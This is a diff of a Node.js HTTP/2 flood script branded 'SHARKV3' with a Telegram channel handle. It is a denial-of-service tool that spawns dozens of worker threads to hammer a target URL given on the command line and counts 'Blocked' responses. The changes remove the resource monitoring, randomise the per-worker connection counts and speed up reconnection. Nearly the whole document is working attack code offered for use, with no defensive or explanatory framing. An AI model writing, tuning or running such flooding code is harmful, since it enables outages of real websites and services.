@@ -1,11 +1,9 @@
 const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
-const { cpus, totalmem } = require('os');
 const readline = require('readline');
 const net = require('net');
 
 const THREADS = 22;
-const INITIAL_CONNECTIONS = 32;
 const POWER_MULTIPLIER = 2;
 const MAX_INFLIGHT = 2000;
 const LIVE_REFRESH_RATE = 100;
@@ -16,6 +14,11 @@ let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
 let end;  // Define the `end` variable here for the main thread
+
+// Helper function to get a random number within a range (inclusive)
+function getRandomInRange(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -32,13 +35,15 @@ if (isMainThread) {
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
     console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-    // Start the workers
+    // Start the workers with dynamic connection numbers
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: true } });
+        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
     }
 
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: false } });
+        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
     }
 
     // Live Stats
@@ -57,20 +62,6 @@ if (isMainThread) {
         const minutesRemaining = Math.floor(timeRemaining / 60);
         const secondsRemaining = Math.floor(timeRemaining % 60);
 
-        // Memory and CPU usage
-        const memoryUsage = process.memoryUsage().rss;  // in bytes
-        const memoryUsageMb = (memoryUsage / 1024 / 1024).toFixed(2);  // convert to MB
-        const totalMemory = totalmem();  // total system memory
-        const memoryPercentage = ((memoryUsage / totalMemory) * 100).toFixed(2);  // in percentage
-
-        // CPU Usage (simple average over all cores)
-        const cpuUsage = cpus().reduce((total, cpu) => {
-            const totalIdle = cpu.times.idle;
-            const totalTick = Object.values(cpu.times).reduce((acc, time) => acc + time, 0);
-            const usage = (1 - totalIdle / totalTick) * 100;  // CPU usage in percentage
-            return total + usage;
-        }, 0) / cpus().length;  // average CPU usage across all cores
-
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
         console.log(`total: ${totalRequests}`);
@@ -80,8 +71,6 @@ if (isMainThread) {
         console.log(`Blocked: ${errorCount}`);
         console.log(`===========================`);
         console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
-        console.log(`RAM: ${memoryPercentage}% (${memoryUsageMb} MB)`);
-        console.log(`CPU: ${cpuUsage.toFixed(2)}%`);
     }
 
     const server = net.createServer(socket => {
@@ -95,8 +84,7 @@ if (isMainThread) {
     server.listen(9999);
 
 } else {
-    const { target, duration, initial } = workerData;
-    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
+    const { target, duration, initial, connections } = workerData;
     const endTime = Date.now() + duration * 1000;  // end time for worker threads
 
     const socket = net.connect(9999, '127.0.0.1');
@@ -128,7 +116,8 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 0.1); // no delay between calls
+        // Slight delay to avoid killing the system
+        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
     }
 
     function createConnection() {
@@ -149,10 +138,10 @@ if (isMainThread) {
             client.on('close', () => setTimeout(createConnection, 500));
 
             client.on('connect', () => {
-                for (let i = 0; i < 550; i++) sendLoop(client, inflight); // boosted request flow
+                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
-            setTimeout(createConnection, 500);
+            setTimeout(createConnection, 100);
         }
     }
 
